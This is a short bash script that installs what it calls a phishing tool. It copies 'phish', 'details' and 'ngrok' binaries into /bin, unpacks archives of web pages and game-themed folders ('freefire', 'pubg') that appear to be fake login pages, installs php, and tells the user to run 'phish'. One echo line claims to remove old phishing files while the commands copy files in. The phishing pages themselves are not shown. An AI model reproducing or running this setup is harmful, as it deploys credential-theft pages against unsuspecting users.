#! /bin/bash
echo "removing all old phishing files"
sleep 10
cp -r details /bin
cp -r phish /bin
cp -r ngrok /bin
chmod 775 /bin/phish
chmod 775 /bin/details
chmod 775 /bin/ngrok
echo "installing files"
sleep 10
mkdir WebPages
unzip WebPages1.zip
unzip WebPages2.zip
unzip WebPages3.zip
unzip games.zip
mkdir games
mv freefire games
mv pubg games
mv WebPages1 WebPages
mv WebPages2 WebPages
mv  WebPages3 WebPages
mv games WebPages
rm -rf WebPages1.zip
rm -rf games.zip
rm -rf WebPages2.zip
rm -rf WebPages3.zip
chmod +x *
apt-get install ruby -y
gem install lolcat
apt-get install php -y



echo "run tool by writing -- phish"
